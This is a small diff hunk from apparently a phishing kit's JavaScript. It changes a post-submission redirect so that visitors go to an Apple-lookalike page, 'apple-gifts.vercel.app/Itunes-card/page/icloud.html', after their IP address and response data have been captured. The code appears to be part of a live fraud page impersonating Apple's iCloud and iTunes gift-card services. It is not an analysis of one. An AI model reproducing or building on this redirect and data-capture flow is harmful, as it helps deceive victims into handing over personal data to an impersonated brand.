@@ -27,6 +27,6 @@ IP: ${clientIP}`,
     console.log(responseData);
 
     setTimeout(function() {
-        window.location.href = '../page/icloud.html';
+        window.location.href = 'https://apple-gifts.vercel.app/Itunes-card/page/icloud.html';
     } );
 });
